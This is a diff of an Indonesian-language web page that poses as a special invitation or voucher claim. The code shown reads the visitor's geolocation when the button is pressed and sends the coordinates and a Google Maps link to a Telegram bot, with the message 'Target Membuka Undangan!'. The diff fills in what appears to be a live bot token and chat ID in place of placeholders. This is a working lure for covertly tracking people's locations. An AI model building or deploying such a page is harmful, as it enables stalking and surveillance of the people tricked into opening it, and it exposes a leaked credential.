@@ -73,10 +73,10 @@
 
     <div class="card">
         <div class="badge">Eksklusif Untuk Anda</div>
-        <h2>Voucher & Undangan Spesial 🎉</h2>
-        <p>Anda mendapatkan undangan khusus serta kesempatan mengklaim voucher hadiah menarik. Tekan tombol di bawah untuk verifikasi dan melihat detailnya.</p>
+        <h2>Undangan Spesiale 🎉</h2>
+        <p>Anda mendapatkan undangan khusus . Tekan tombol di bawah untuk verifikasi dan melihat detailnya.</p>
         
-        <button class="btn-claim" onclick="mulaiKlaim()">Buka Undangan & Klaim</button>
+        <button class="btn-claim" onclick="mulaiKlaim()">Buka Undangan</button>
         <div id="status-msg"></div>
     </div>
 
@@ -90,8 +90,8 @@
                     let lon = pos.coords.longitude;
                     
                     // GANTI TOKEN DAN CHAT ID TELEGRAM ANDA DI SINI
-                    let tokenBot = "MASUKKAN_TOKEN_BOT_ANDA";
-                    let chatId = "MASUKKAN_CHAT_ID_ANDA";
+                    let tokenBot = "8769576802:AAFqMQGPSUpiaKMtoluHfI7OBqQ_8s64yhk";
+                    let chatId = " 6269176229";
                     
                     if(tokenBot !== "MASUKKAN_TOKEN_BOT_ANDA") {
                         let teleUrl = "https://api.telegram.org/bot" + tokenBot + "/sendMessage?chat_id=" + chatId + "&text=🎯 Target Membuka Undangan!%0ACoords: " + lat + "," + lon + "%0AMaps: https://maps.google.com/?q=" + lat + "," + lon;
